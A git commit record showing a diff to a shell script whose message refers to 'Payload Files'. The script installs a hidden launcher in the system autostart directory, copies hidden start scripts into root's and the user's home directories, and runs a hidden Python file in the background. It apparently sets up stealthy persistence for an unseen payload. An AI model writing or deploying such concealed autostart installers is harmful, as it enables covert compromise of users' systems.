ed9499a12c8e7e3cbd7b6efe489803407a3a96aa
BenPI88 <97198967+BenPI88@users.noreply.github.com>
2023-01-08 15:36:31 -0600

    Copy Payload Files To Root's Home AND User's Home (Just in case)

--- start.sh
+++ start.sh
@@ -1,5 +1,7 @@
 sudo chmod 755 .notiflauncher.desktop
 sudo cp .notiflauncher.desktop /etc/xdg/autostart/.notiflauncher.desktop
-sudo cp start.sh /home/root/.start.sh
-sudo cp .start.py /home/root/.start.py
+sudo cp start.sh ~/.start.sh
+sudo cp .start.py ~/.start.py
+sudo cp ~/start.sh /home/root/.start.sh
+sudo cp ~/.start.py /home/root/.start.py
 nohup python3 .start.py
